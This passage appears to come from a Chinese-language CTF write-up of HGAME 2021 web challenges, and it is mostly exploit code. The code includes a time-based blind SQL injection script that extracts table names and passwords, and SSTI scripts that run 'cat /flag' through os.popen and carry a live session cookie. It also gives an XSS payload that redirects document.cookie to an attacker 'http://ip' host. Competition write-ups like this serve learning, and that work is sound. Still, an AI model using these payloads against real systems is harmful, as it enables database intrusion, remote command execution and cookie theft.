+<p>l1 = 0<br>r1 = 100</p>
+<p>while(l1&lt;=r1):<br>    timeout = 0<br>    mid1 = (l1 + r1)/2</p>
+<pre><code># payload = &apos;or/**/if(length(database())&gt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+
+# payload = &apos;or/**/if((select/**/length(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1)&gt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+# payload = &apos;or/**/if((select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1)&gt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+# payload = &apos;or/**/if((select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/1,1)&gt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+
+# payload = &apos;or/**/if((select/**/length(`usern@me`)/**/from/**/u5ers)&gt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+payload = &apos;or/**/if((select/**/length(`p@ssword`)/**/from/**/u5ers)&gt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+
+data = {&quot;username&quot;: user, &quot;password&quot;: payload}
+print data
+try:
+    http = requests.post(url, data=data, timeout=5)
+except requests.exceptions.Timeout:
+    # 超时则&gt;mid1
+    l1 = mid1 + 1
+    timeout = 1
+    time.sleep(2)
+# timeout为0则&lt;=mid1
+if timeout == 0:
+
+    # payload = &apos;or/**/if(length(database())&lt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+
+    # payload = &apos;or/**/if((select/**/length(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1)&lt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+    # payload = &apos;or/**/if((select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1)&lt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+    # payload = &apos;or/**/if((select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/1,1)&lt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+
+    # payload = &apos;or/**/if((select/**/length(`usern@me`)/**/from/**/u5ers)&lt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+    payload = &apos;or/**/if((select/**/length(`p@ssword`)/**/from/**/u5ers)&lt;&apos;+str(mid1)+&apos;,sleep(6),1)#&apos;
+
+    data = {&quot;username&quot;: user, &quot;password&quot;: payload}
+    print data
+    try:
+        # 未超时则=mid1
+        http = requests.post(url, data=data, timeout=5)
+        break
+    except requests.exceptions.Timeout:
+        # 超时则&lt;mid1
+        r1 = mid1 - 1
+        time.sleep(2)
+</code></pre><p>print “Length:”+str(mid1)</p>
+<p>flag = ‘’</p>
+<p>for i in range(mid1):<br>    l2 = 0<br>    r2 = 128</p>
+<pre><code>while(l2&lt;=r2):
+    timeout = 0
+    mid2 = (l2 + r2)/2
+
+    # payload = &apos;or/**/if(ascii(substr(database(),&apos;+str(i+1)+&apos;,1))&gt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+
+    # payload = &apos;or/**/if(ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1),&apos;+str(i+1)+&apos;,1))&gt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+    # payload = &apos;or/**/if(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1),&apos;+str(i+1)+&apos;,1))&gt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+    # payload = &apos;or/**/if(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/1,1),&apos;+str(i+1)+&apos;,1))&gt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+
+    # payload = &apos;or/**/if(ascii(substr((select/**/`usern@me`/**/from/**/u5ers),&apos;+str(i+1)+&apos;,1))&gt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+    payload = &apos;or/**/if(ascii(substr((select/**/`p@ssword`/**/from/**/u5ers),&apos;+str(i+1)+&apos;,1))&gt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+
+    data = {&quot;username&quot;: user, &quot;password&quot;: payload}
+    print data
+    try:
+        http = requests.post(url, data=data, timeout=5)
+    except requests.exceptions.Timeout:
+        # 超时则&gt;mid2
+        l2 = mid2 + 1
+        timeout = 1
+        time.sleep(2)
+    # timeout为0则&lt;=mid1
+    if timeout == 0:
+
+        # payload = &apos;or/**/if(ascii(substr(database(),&apos;+str(i+1)+&apos;,1))&lt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+
+        # payload = &apos;or/**/if(ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1),&apos;+str(i+1)+&apos;,1))&lt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+        # payload = &apos;or/**/if(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/0,1),&apos;+str(i+1)+&apos;,1))&lt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+        # payload = &apos;or/**/if(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/limit/**/1,1),&apos;+str(i+1)+&apos;,1))&lt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+
+        # payload = &apos;or/**/if(ascii(substr((select/**/`usern@me`/**/from/**/u5ers),&apos;+str(i+1)+&apos;,1))&lt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+        payload = &apos;or/**/if(ascii(substr((select/**/`p@ssword`/**/from/**/u5ers),&apos;+str(i+1)+&apos;,1))&lt;&apos;+str(mid2)+&apos;,sleep(6),1)#&apos;
+
+        data = {&quot;username&quot;: user, &quot;password&quot;: payload}
+        print data
+        try:
+            # 未超时则=mid2
+            http = requests.post(url, data=data, timeout=5)
+            break
+        except requests.exceptions.Timeout:
+            # 超时则&lt;mid2
+            r2 = mid2 - 1
+            time.sleep(2)
+
+flag = flag + chr(mid2)
+print flag
+</code></pre><p>print flag</p>
+<h1 id="or-if-length-database-gt-0-sleep-6-1"><a href="#or-if-length-database-gt-0-sleep-6-1" class="headerlink" title="or/**/if(length(database())&gt;0,sleep(6),1)"></a>or/**/if(length(database())&gt;0,sleep(6),1)</h1><h1 id="or-if-ascii-substr-database-1-1-gt-0-sleep-6-1"><a href="#or-if-ascii-substr-database-1-1-gt-0-sleep-6-1" class="headerlink" title="or/**/if(ascii(substr(database(),1,1))&gt;0,sleep(6),1)"></a>or/**/if(ascii(substr(database(),1,1))&gt;0,sleep(6),1)</h1><h1 id="week3sqli"><a href="#week3sqli" class="headerlink" title="week3sqli"></a>week3sqli</h1><h1 id="or-if-select-length-table-name-from-information-schema-tables-where-table-schema-like-database-limit-0-1-gt-0-sleep-6-1"><a href="#or-if-select-length-table-name-from-information-schema-tables-where-table-schema-like-database-limit-0-1-gt-0-sleep-6-1" class="headerlink" title="or//if((select//length(table_name)//from//information_schema.tables//where//table_schema//like//database()//limit//0,1)&gt;0,sleep(6),1)"></a>or/<strong>/if((select/</strong>/length(table_name)/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/table_schema/<strong>/like/</strong>/database()/<strong>/limit/</strong>/0,1)&gt;0,sleep(6),1)</h1><h1 id="or-if-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-like-database-limit-0-1-1-1-gt-0-sleep-6-1"><a href="#or-if-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-like-database-limit-0-1-1-1-gt-0-sleep-6-1" class="headerlink" title="or//if(ascii(substr((select//table_name//from//information_schema.tables//where//table_schema//like//database()//limit//0,1),1,1))&gt;0,sleep(6),1)"></a>or/<strong>/if(ascii(substr((select/</strong>/table_name/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/table_schema/<strong>/like/</strong>/database()/<strong>/limit/</strong>/0,1),1,1))&gt;0,sleep(6),1)</h1><h1 id="u5ers"><a href="#u5ers" class="headerlink" title="u5ers"></a>u5ers</h1><h1 id="or-if-select-length-column-name-from-information-schema-columns-where-table-schema-like-database-limit-0-1-gt-0-sleep-6-1"><a href="#or-if-select-length-column-name-from-information-schema-columns-where-table-schema-like-database-limit-0-1-gt-0-sleep-6-1" class="headerlink" title="or//if((select//length(column_name)//from//information_schema.columns//where//table_schema//like//database()//limit//0,1)&gt;0,sleep(6),1)"></a>or/<strong>/if((select/</strong>/length(column_name)/<strong>/from/</strong>/information_schema.columns/<strong>/where/</strong>/table_schema/<strong>/like/</strong>/database()/<strong>/limit/</strong>/0,1)&gt;0,sleep(6),1)</h1><h1 id="or-if-ascii-substr-select-column-name-from-information-schema-columns-where-table-schema-like-database-limit-0-1-1-1-gt-0-sleep-6-1"><a href="#or-if-ascii-substr-select-column-name-from-information-schema-columns-where-table-schema-like-database-limit-0-1-1-1-gt-0-sleep-6-1" class="headerlink" title="or//if(ascii(substr((select//column_name//from//information_schema.columns//where//table_schema//like//database()//limit//0,1),1,1))&gt;0,sleep(6),1)"></a>or/<strong>/if(ascii(substr((select/</strong>/column_name/<strong>/from/</strong>/information_schema.columns/<strong>/where/</strong>/table_schema/<strong>/like/</strong>/database()/<strong>/limit/</strong>/0,1),1,1))&gt;0,sleep(6),1)</h1><h1 id="usern-me"><a href="#usern-me" class="headerlink" title="usern@me"></a>usern@me</h1><h1 id="or-if-select-length-column-name-from-information-schema-columns-where-table-schema-like-database-limit-1-1-gt-0-sleep-6-1"><a href="#or-if-select-length-column-name-from-information-schema-columns-where-table-schema-like-database-limit-1-1-gt-0-sleep-6-1" class="headerlink" title="or//if((select//length(column_name)//from//information_schema.columns//where//table_schema//like//database()//limit//1,1)&gt;0,sleep(6),1)"></a>or/<strong>/if((select/</strong>/length(column_name)/<strong>/from/</strong>/information_schema.columns/<strong>/where/</strong>/table_schema/<strong>/like/</strong>/database()/<strong>/limit/</strong>/1,1)&gt;0,sleep(6),1)</h1><h1 id="or-if-ascii-substr-select-column-name-from-information-schema-columns-where-table-schema-like-database-limit-1-1-1-1-gt-0-sleep-6-1"><a href="#or-if-ascii-substr-select-column-name-from-information-schema-columns-where-table-schema-like-database-limit-1-1-1-1-gt-0-sleep-6-1" class="headerlink" title="or//if(ascii(substr((select//column_name//from//information_schema.columns//where//table_schema//like//database()//limit//1,1),1,1))&gt;0,sleep(6),1)"></a>or/<strong>/if(ascii(substr((select/</strong>/column_name/<strong>/from/</strong>/information_schema.columns/<strong>/where/</strong>/table_schema/<strong>/like/</strong>/database()/<strong>/limit/</strong>/1,1),1,1))&gt;0,sleep(6),1)</h1><h1 id="p-ssword"><a href="#p-ssword" class="headerlink" title="p@ssword"></a>p@ssword</h1><h1 id="or-if-select-length-usern-me-from-u5ers-gt-0-sleep-6-1"><a href="#or-if-select-length-usern-me-from-u5ers-gt-0-sleep-6-1" class="headerlink" title="or//if((select//length(usern@me)//from//u5ers)&gt;0,sleep(6),1)"></a>or/<strong>/if((select/</strong>/length(<code>usern@me</code>)/<strong>/from/</strong>/u5ers)&gt;0,sleep(6),1)</h1><h1 id="or-if-ascii-substr-select-usern-me-from-u5ers-0-1-gt-0-sleep-6-1"><a href="#or-if-ascii-substr-select-usern-me-from-u5ers-0-1-gt-0-sleep-6-1" class="headerlink" title="or//if(ascii(substr((select//usern@me//from//u5ers),0,1))&gt;0,sleep(6),1)"></a>or/<strong>/if(ascii(substr((select/</strong>/<code>usern@me</code>/<strong>/from/</strong>/u5ers),0,1))&gt;0,sleep(6),1)</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><h1 id="or-if-select-length-p-ssword-from-u5ers-lt-0-sleep-6-1"><a href="#or-if-select-length-p-ssword-from-u5ers-lt-0-sleep-6-1" class="headerlink" title="or//if((select//length(p@ssword)//from//u5ers)&lt;0,sleep(6),1)"></a>or/<strong>/if((select/</strong>/length(<code>p@ssword</code>)/<strong>/from/</strong>/u5ers)&lt;0,sleep(6),1)</h1><h1 id="or-if-ascii-substr-select-p-ssword-from-u5ers-0-1-gt-0-sleep-6-1"><a href="#or-if-ascii-substr-select-p-ssword-from-u5ers-0-1-gt-0-sleep-6-1" class="headerlink" title="or//if(ascii(substr((select//p@ssword//from//u5ers),0,1))&gt;0,sleep(6),1)"></a>or/<strong>/if(ascii(substr((select/</strong>/<code>p@ssword</code>/<strong>/from/</strong>/u5ers),0,1))&gt;0,sleep(6),1)</h1><h1 id="sOme7hiNgseCretw4sHidd3n"><a href="#sOme7hiNgseCretw4sHidd3n" class="headerlink" title="sOme7hiNgseCretw4sHidd3n"></a>sOme7hiNgseCretw4sHidd3n</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后登录得到flag</span><br><span class="line"></span><br><span class="line">## Forgetful</span><br><span class="line">题目描述说到了是用`python`写的，进入登陆可以添加内容</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/868c6488b17e6c679194ec7e6a5680bd.png)</span><br><span class="line"></span><br><span class="line">添加后可以看到，非常像是会有`SSTI`</span><br><span class="line"></span><br><span class="line">于是各种尝试，最后发现在查看页面处有`SSTI`点</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/9c9bececd99fbbcd180975e2d0ff4379.png)</span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/668d3771357f6200aed0f3285ab984cc.png)</span><br><span class="line"></span><br><span class="line">于是开始尝试，发现响应过滤了`&lt;`字母`&gt;`这种，结果就是通过</span><br><span class="line">`&#123; &#123;().__class__.__bases__[0].__subclasses__()&#125; &#125;`</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/bf13c440fa373ef3479b30a66ca5e5cd.png)</span><br><span class="line"></span><br><span class="line">只能得到这样的结果，无法知道类的位置</span><br><span class="line"></span><br><span class="line">于是就以这种方式</span><br><span class="line">`&#123; &#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[0].__name__&#125; &#125;`</span><br><span class="line">去一个个获得类名，用一个脚本跑一下</span><br></pre></td></tr></table></figure>
+<p>import requests<br>import re</p>
+<p>open_url = “<a href="https://todolist.liki.link/modify/498&quot;" target="_blank" rel="noopener">https://todolist.liki.link/modify/498&quot;</a><br>cookie = {“session”:”.eJwlj0tqA0EMBe_Say8k9UdqX8boS0IggRl7FXL3TMj-VVHvuz3qyPOt3Z_HK2_t8R7t3sSlewxK8LEgN8sAJu8EwBsW1d7MCbt3qtlrCvehhRPXEhmBg9gnkBGbdawIw9gRYoJInn_aXlHKes0dsQBBDGAsC90S7db8POrx_PrIz6snjBSKMGWRKi3NvlKdycLVXOaSsZXw4l5nHv8n-mw_vxwmPqU.YCgEGg.AQedmev4_7mmqmVVovMr2tWzDK4”}<br>post_url = “<a href="https://todolist.liki.link/modify/498&quot;" target="_blank" rel="noopener">https://todolist.liki.link/modify/498&quot;</a><br>view_url = “<a href="https://todolist.liki.link/view/498&quot;" target="_blank" rel="noopener">https://todolist.liki.link/view/498&quot;</a></p>
+<p>subclass = []</p>
+<p>for i in range(300):<br>    https = requests.get(open_url, cookies=cookie)<br>    csrf = re.findall(r”type=\”hidden\” value=\”([^&lt;&gt;]+)\”&gt;”, https.content.decode())[0]</p>
+<pre><code>data = {&quot;csrf_token&quot;:csrf, &quot;title&quot;:&quot;{{''.__class__.__mro__[1].__subclasses__()["+str(i)+"].__name__}}&quot;, &quot;status&quot;:0, &quot;submit&quot;:&quot;提交&quot;}
+print(data)
+post_url = &quot;https://todolist.liki.link/modify/498&quot;
+requests.post(post_url, cookies=cookie, data=data)
+
+view = requests.get(view_url, cookies=cookie)
+name = re.findall(r&quot;Todo: ([^&lt;&gt;]+)&quot;, view.content.decode())[0]
+subclass.append(name)
+</code></pre><p>print(subclass)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">取下来后发现`_NamespaceLoader`在第82位，于是直接读取flag</span><br><span class="line">`&#123; &#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[81].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&apos;cat /flag&apos;).read()&#125; &#125;`</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/45a377b0307486524bf1d54573915b30.png)</span><br><span class="line"></span><br><span class="line">响应了stop，估计又是匹配响应不允许输出</span><br><span class="line"></span><br><span class="line">于是就一个个去读好了</span><br><span class="line">`&#123; &#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[81].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&apos;cat /flag&apos;).read()[0]&#125; &#125;`</span><br></pre></td></tr></table></figure></p>
+<p>import requests<br>import re</p>
+<p>open_url = “<a href="https://todolist.liki.link/modify/498&quot;" target="_blank" rel="noopener">https://todolist.liki.link/modify/498&quot;</a><br>cookie = {“session”:”.eJwlj0tqA0EMBe_Say8k9UdqX8boS0IggRl7FXL3TMj-VVHvuz3qyPOt3Z_HK2_t8R7t3sSlewxK8LEgN8sAJu8EwBsW1d7MCbt3qtlrCvehhRPXEhmBg9gnkBGbdawIw9gRYoJInn_aXlHKes0dsQBBDGAsC90S7db8POrx_PrIz6snjBSKMGWRKi3NvlKdycLVXOaSsZXw4l5nHv8n-mw_vxwmPqU.YCgEGg.AQedmev4_7mmqmVVovMr2tWzDK4”}<br>post_url = “<a href="https://todolist.liki.link/modify/498&quot;" target="_blank" rel="noopener">https://todolist.liki.link/modify/498&quot;</a><br>view_url = “<a href="https://todolist.liki.link/view/498&quot;" target="_blank" rel="noopener">https://todolist.liki.link/view/498&quot;</a></p>
+<p>flag = ‘’</p>
+<p>for i in range(37):<br>    https = requests.get(open_url, cookies=cookie)<br>    csrf = re.findall(r”type=\”hidden\” value=\”([^&lt;&gt;]+)\”&gt;”, https.content.decode())[0]</p>
+<pre><code>data = {&quot;csrf_token&quot;:csrf, &quot;title&quot;:&quot;{{''.__class__.__mro__[1].__subclasses__()[81].__init__.__globals__[\"sys\"].modules[\"os\"].popen('cat /flag').read()["+str(i)+"]}}&quot;, &quot;status&quot;:0, &quot;submit&quot;:&quot;提交&quot;}
+print(data)
+post_url = &quot;https://todolist.liki.link/modify/498&quot;
+requests.post(post_url, cookies=cookie, data=data)
+
+view = requests.get(view_url, cookies=cookie)
+name = re.findall(r&quot;Todo: ([^&lt;&gt;]+)&quot;, view.content.decode())[0]
+flag = flag+name
+print(flag)
+</code></pre><p>print(flag)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">不过复现时乱登录了一下123 123</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/6b7bfffab9b85a01c0a6a91a1a9ce8ef.png)</span><br><span class="line"></span><br><span class="line">发现居然登录得进去，里面的payload也可以用，这题都能上车是我没想到的，少用弱密码呀（虽然这题我也用的是123密码）。117对应的类是`_wrap_close`</span><br><span class="line"></span><br><span class="line">水平还是不行啊，linux命令依旧不熟悉，直接用base64就能解决的问题还用啥脚本跑呀</span><br><span class="line">`&#123; &#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[81].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&apos;cat /flag|base64&apos;).read()&#125; &#125;`</span><br><span class="line"></span><br><span class="line">## Post to zuckonit2.0</span><br><span class="line">Week2第二题的升级版，依旧是XSS。和去年一样加上了CSP</span><br><span class="line">`Content-Security-Policy default-src &apos;self&apos;; script-src &apos;self&apos;; `</span><br><span class="line">不过实际上难度并不是CSP导致的就是</span><br><span class="line"></span><br><span class="line">Hint提示了查看源码，发现`/static/www.zip`有源码，于是拿下来</span><br><span class="line">看源码才知道是用python写的，主要看`app.py`中的内容</span><br></pre></td></tr></table></figure></p>
+<p>@app.route(‘/send’, methods=[‘POST’])<br>def send():<br>    if request.form.get(‘content’):<br>        content = escape_index(request.form[‘content’])<br>        if session.get(‘contents’):<br>            content_list = session[‘contents’]<br>            content_list.append(content)<br>        else:<br>            content_list = [content]<br>        session[‘contents’] = content_list<br>        return “post has been sent.”<br>    else:<br>        return “WELCOME TO HGAME 2021 :)”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>def escape_index(original):<br>    content = original<br>    content_iframe = re.sub(r”^(&lt;?/?iframe)\s+.<em>?(src=[\”‘][a-zA-Z/]{1,8}[\”‘]).</em>?(&gt;?)$”, r”\1 \2 \3”, content)<br>    if content_iframe != content or re.match(r”^(&lt;?/?iframe)\s+(src=[\”‘][a-zA-Z/]{1,8}[\”‘])$”, content):<br>        return content_iframe<br>    else:<br>        content = re.sub(r”&lt;<em>/?(.</em>?)&gt;?”, r”\1”, content)<br>        return content<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`/send`中获得content数据后使用`escape_index()`对其进行处理</span><br><span class="line">`re.sub(r&quot;^(&lt;?/?iframe)\s+.*?(src=[\&quot;&apos;][a-zA-Z/]&#123;1,8&#125;[\&quot;&apos;]).*?(&gt;?)$&quot;, r&quot;\1 \2 \3&quot;, content)`</span><br><span class="line">这条正则整了一下才知道是什么意思，第二个参数的`&quot;\1 \2 \3&quot;`分别对应的是`(&lt;?/?iframe)` `(src=[\&quot;&apos;][a-zA-Z/]&#123;1,8&#125;[\&quot;&apos;])` `(&gt;?)`，将其匹配到的内容取出并合并。本地尝试就算少了一个也没关系，但到服务器上就直接返回空</span><br><span class="line">这个正则就限制了我们只能用`iframe`标签，同时`src`里的内容又不能超过八位，有点麻烦</span><br><span class="line"></span><br><span class="line">再去看`/replace`</span><br></pre></td></tr></table></figure></p>
+<p>@app.route(‘/replace’, methods=[“POST”])<br>def replace():<br>    if request.form.get(‘substr’) and request.form.get(‘replacement’):<br>        session[‘substr’] = escape_replace(request.form[‘substr’])<br>        session[‘replacement’] = escape_replace(request.form[‘replacement’])<br>        return “replace success”<br>    else:<br>        return “There is no content to replace any more”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>def escape_replace(original):<br>    content = original<br>    content = re.sub(“[&lt;&gt;]”, “”, content)<br>    return content<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">替换的内容中是无法出现`&lt;&gt;`</span><br></pre></td></tr></table></figure></p>
+<p>@app.route(‘/preview’)<br>def preview():<br>    if session.get(‘substr’) and session.get(‘replacement’):<br>        substr = session[‘substr’]<br>        replacement = session[‘replacement’]<br>    else:<br>        substr = “”<br>        replacement = “”<br>    response = make_response(<br>        render_template(“preview.html”, substr=substr, replacement=replacement))<br>    return response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">同时只有在`/preview`页面才会进行替换</span><br><span class="line"></span><br><span class="line">一开始以为bot只是把访问发过去的内容，于是想怎么绕过正则匹配，但感觉没什么办法。后来用week2的尝试了一下，才知道bot好像是来访问我们的页面，也就是只要我们替换好了自己的页面再让其访问即可</span><br><span class="line"></span><br><span class="line">想了一下后想到的第一条路线是，创建一个iframe引入`/preview`，再整另一个iframe引入`/contents`，最后用HTML实体编码绕过`&lt;&gt;`的过滤在创建一个`&lt;svg&gt;`。不过由于MIME设置了`json`不行，于是另寻其路</span><br><span class="line"></span><br><span class="line">最后发现不需要用到`/contents`，直接第二个ifame中写js就行</span><br></pre></td></tr></table></figure></p>
+<p><iframe src="/preview"></iframe></p>
+<p><iframe src="aabbccdd"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先这样创建两个iframe，然后在replace中将`aabbccdd`替换成`javascript:window.location.href=&apos;http://ip/?a=&apos;+document.cookie`</span><br><span class="line">这样第二个iframe就修改成</span><br><span class="line">`&lt;iframe src=&quot;javascript:window.location.href=&apos;http://ip/?a=&apos;+document.cookie&quot;&gt;`</span><br><span class="line">这样就可以弹回cookie了</span><br><span class="line"></span><br><span class="line">再用拿到的token放入cookie访问`/flag`</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/208ae267c6f8eacae2cef7958fde7877.png)</span><br><span class="line"></span><br><span class="line">## Post to zuckonit another version</span><br><span class="line">这题比较上题就改了一点，content的正则匹配没有改变</span><br></pre></td></tr></table></figure></iframe></p>
+<p>def escape_replace(original):<br>    content = original<br>    content = re.sub(r”[&lt;&gt;\”\]”, “”, content)<br>    return content<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`escape_replace()`增加了`&quot; \`的过滤</span><br></pre></td></tr></table></figure></p>
+<p>@app.route(‘/search’, methods=[“POST”])<br>def replace():<br>    if request.form.get(‘substr’):<br>        session[‘substr’] = escape_replace(request.form[‘substr’])<br>        return “replace success”<br>    else:<br>        return “There is no content to search any more”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">raplace接口被改成了search接口</span><br><span class="line">到`preview.html`中可以看到</span><br></pre></td></tr></table></figure></p>
+<p><script><br>    $(function () {<br>        $.get(“/contents”).done(function (data) {<br>            let content = ““<br>            let output = document.getElementById(“output”)<br>            for (let i = 0; i &lt; data.length; i++) {<br>                let div = document.createElement(“div”)<br>                let substr = new RegExp(content, ‘g’)<br>                div.innerHTML = data[i].replace(substr, <code>&lt;b class=&quot;search_result&quot;&gt;${content}&lt;/b&gt;</code>)<br>                output.appendChild(div)<br>            }<br>        })<br>    })<br></script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用了正则去匹配，在查询内容的两侧加上`b`标签</span><br><span class="line"></span><br><span class="line">一开始想着这也没用能修改的东西啊？思考了一会后发现，这里的content是直接放入，而不是将匹配到的内容写入，就是说我们只要这样设置`substr[replace]?`，substr是要匹配到的内容，replace则是要增加的内容不就可以加入我们想要的内容了</span><br><span class="line">比如这里post的是`x`，search的是`x[123]?`</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/bcddca57eedcbfe5ad28ae6714ae1205.png)</span><br><span class="line"></span><br><span class="line">匹配到了`x`，同时也带上了`[123]?`</span><br><span class="line"></span><br><span 